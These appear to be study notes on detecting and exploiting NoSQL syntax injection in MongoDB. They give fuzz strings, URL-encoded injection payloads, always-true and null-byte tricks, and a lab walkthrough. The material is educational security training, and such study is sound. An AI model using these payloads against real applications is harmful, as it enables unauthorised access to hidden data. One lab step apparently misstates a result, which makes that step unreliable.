## NoSQL syntax injection

   - To find NoSQL injection vulnerabilities, try sending inputs with unusual characters or fuzz strings to the application. If it doesn't handle them properly, it might reveal a security issue, like a database error or unexpected behavior.
   - If you know the API language of the target database, use special characters and fuzz strings that are relevant to that language. Otherwise, use a variety of fuzz strings to target multiple API languages.

### Detecting syntax injection in MongoDB

  Consider a shopping application that displays products in different categories.
  
**When the user selects the "Fizzy drinks" category, their browser requests the following URL:**
```js
https://insecure-website.com/product/lookup?category=fizzy  
```

**This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:**
```js
this.category == 'fizzy'   
```

**To test whether the input may be vulnerable, submit a fuzz string in the value of the `category` parameter. An example string for MongoDB is:**
```js
'"`{ 
;$Foo} 
$Foo \xYZ
```

**Use this fuzz string to construct the following attack:**
```js
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00   
```
If this causes a change from the original response, this may indicate that user input isn't filtered or sanitized correctly.

#### Note

   - NoSQL injection vulnerabilities can occur in a variety of contexts, and you need to adapt your fuzz strings accordingly. Otherwise, you may simply trigger validation errors that mean the application never executes your query.
   - In this example, we're injecting the fuzz string via the URL, so the string is URL-encoded. In some applications, you may need to inject your payload via a JSON property instead. In this case, this payload would become ``'\"`{\r;$Foo}\n$Foo \\xYZ\u0000``.

#### Determining which characters are processed

**To determine which characters are interpreted as syntax by the application, you can inject individual characters. For example, you could submit `'`, which results in the following MongoDB query:**
```sql
this.category == '''
```
  - If this causes a change from the original response, this may indicate that the `'` character has broken the query syntax and caused a syntax error.

**You can confirm this by submitting a valid query string in the input, for example by escaping the quote:**
```sql
this.category == '\''
```
   - If this doesn't cause a syntax error, this may mean that the application is vulnerable to an injection attack.

#### Confirming conditional behavior

   After detecting a vulnerability, the next step is to determine whether you can influence boolean conditions using NoSQL syntax. 
   
**To test boolean conditions, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements `' && 0 && 'x` and `' && 1 && 'x` as follows:**
```js
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```

```js
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```
If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.

#### Overriding existing conditions

**Now that you have identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as `'||1||'`**
```js
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27   
```

**This results in the following MongoDB query:**
```js
this.category == 'fizzy'||'1'=='1'
```
   - As the injected condition is always true, the modified query returns all items. This enables you to view all the products in any category, including hidden or unknown categories.

#### Warning
   Take care when injecting a condition that always evaluates to true into a NoSQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If an application uses it when updating or deleting data, for example, this can result in accidental data loss.

You could also add a null character after the category value. MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored. 

For example, the query may have an additional `this.released` restriction:
```js
this.category == 'fizzy' && this.released == 1
```
The restriction `this.released == 1` is used to only show products that are released. For unreleased products, presumably `this.released == 0`.

In this case, an attacker could construct an attack as follows:
```js
https://insecure-website.com/product/lookup?category=fizzy'%00
```

This results in the following NoSQL query:
```js
this.category == 'fizzy'\u0000' && this.released == 1
```
If MongoDB ignores all characters after the null character, this removes the requirement for the released field to be set to 1. As a result, all products in the `fizzy` category are displayed, including unreleased products.




## Steps to solve lab - 
### Title - Detecting NoSQL injection

**Desc** - The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to [NoSQL injection](https://portswigger.net/web-security/nosql-injection). To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.

1. Test each end-point of application for the possibility of NoSQL injection and got that end-point.
![[nosql2.png]]

2. This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:
```js
this.category=Gifts
```

3. In Repeater, submit a `'` character in the category parameter. Notice that this causes a JavaScript syntax error. This may indicate that the user input was not filtered or sanitized correctly.
![[nosql3.png]]

4. Submit a valid JavaScript payload in the value of the category query parameter. You could use the following payload:
```js
Gifts'+'
```

![[nosql4.png]]

Make sure to URL-encode the payload by highlighting it and using the `Ctrl-U` hotkey. Notice that it doesn't cause a syntax error. This indicates that a form of server-side injection may be occurring.

5. Identify whether you can inject boolean conditions to change the response:
   
   1. Insert a false condition in the category parameter. For example:
```js
Gifts' && 0 && 'x	
```

![[nosql5.png]]

Make sure to URL-encode the payload. Notice that no products are retrieved.
![[nosql6.png]]

   2. Insert a true condition in the category parameter. For example:
```js
Gifts' && 1 && 'x
```

![[nosql7.png]]

Make sure to URL-encode the payload. Notice that no products are retrieved.
![[nosql8.png]]

6. Submit a boolean condition that always evaluates to true in the category parameter. For example:
```js
Gifts'||1||'
```

![[nosql9.png]]

![[nosql10.png]]

